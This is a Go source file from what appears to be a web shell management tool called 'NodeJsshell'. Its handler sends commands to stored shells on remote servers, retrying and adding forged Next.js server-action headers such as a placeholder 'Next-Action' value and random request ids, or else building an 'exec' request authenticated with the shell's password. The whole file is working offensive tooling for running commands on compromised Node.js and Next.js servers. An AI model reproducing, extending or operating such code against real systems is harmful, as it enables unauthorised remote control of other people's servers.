package handlers

import (
	"encoding/json"
	"NodeJsshell/internal/core/transport"
	"NodeJsshell/internal/database"
	"strings"
	"time"
	"github.com/google/uuid"
)

func SendRequest(httpClient *transport.HTTPClient, shell *database.Shell, command string) (*transport.Response, error) {
	isNextJS := strings.Contains(shell.Protocol, "nextjs") || strings.Contains(shell.Protocol, "next") || strings.Contains(shell.URL, "nextjs")
	maxRetries := 3
	if isNextJS {
		maxRetries = 5
	}
	
	var lastResp *transport.Response
	var lastErr error
	
	for attempt := 0; attempt < maxRetries; attempt++ {
		if attempt > 0 {
			delay := time.Duration(attempt*100) * time.Millisecond
			if delay > 500*time.Millisecond {
				delay = 500 * time.Millisecond
			}
			time.Sleep(delay)
		}
		
		var customHeaders map[string]string
		if shell.CustomHeaders != "" {
			json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
		}
		if customHeaders == nil {
			customHeaders = make(map[string]string)
		}
		
		if shell.Protocol == "multipart" {
			if customHeaders["Next-Action"] == "" {
				customHeaders["Next-Action"] = "x"
			}
			if isNextJS || attempt > 0 {
				customHeaders["X-Nextjs-Request-Id"] = uuid.New().String()[:8]
				customHeaders["X-Nextjs-Html-Request-Id"] = uuid.New().String()[:16]
			} else {
				if customHeaders["X-Nextjs-Request-Id"] == "" {
					customHeaders["X-Nextjs-Request-Id"] = uuid.New().String()[:8]
				}
				if customHeaders["X-Nextjs-Html-Request-Id"] == "" {
					customHeaders["X-Nextjs-Html-Request-Id"] = uuid.New().String()[:16]
				}
			}
			
			if shell.Method == "GET" {
				lastResp, lastErr = httpClient.SendGetRequest(shell.URL, command, shell.Password, shell.EncodeType, customHeaders)
			} else {
				lastResp, lastErr = httpClient.SendMultipartRequestWithProtocol(shell.URL, command, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
			}
		} else {
			transportReq := transport.BuildRequest(shell.Password, shell.EncodeType, "exec", command)
			lastResp, lastErr = httpClient.SendRequest(shell.URL, transportReq)
		}
		
		if lastErr != nil {
			continue
		}
		
		if lastResp != nil && lastResp.Success {
			return lastResp, nil
		}
		
		if lastResp != nil && lastResp.Error != "" {
			errorLower := strings.ToLower(lastResp.Error)
			if strings.Contains(errorLower, "server action not found") {
				continue
			}
		}
		
		if lastResp != nil && lastResp.Data != "" {
			dataLower := strings.ToLower(lastResp.Data)
			if strings.Contains(dataLower, "server action not found") {
				continue
			}
		}
		
		if lastResp != nil && !lastResp.Success {
			if isNextJS && attempt < maxRetries-1 {
				continue
			}
		}
	}
	
	if lastErr != nil {
		return nil, lastErr
	}
	
	if lastResp == nil {
		return &transport.Response{
			Success:   false,
			Error:     "No response after retries",
			Timestamp: time.Now().Unix(),
		}, nil
	}
	
	return lastResp, nil
}

func getCustomHeaders(shell *database.Shell) map[string]string {
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		if customHeaders["Next-Action"] == "" {
			customHeaders["Next-Action"] = "x"
		}
		if customHeaders["X-Nextjs-Request-Id"] == "" {
			customHeaders["X-Nextjs-Request-Id"] = uuid.New().String()[:8]
		}
		if customHeaders["X-Nextjs-Html-Request-Id"] == "" {
			customHeaders["X-Nextjs-Html-Request-Id"] = uuid.New().String()[:16]
		}
	}
	return customHeaders
}

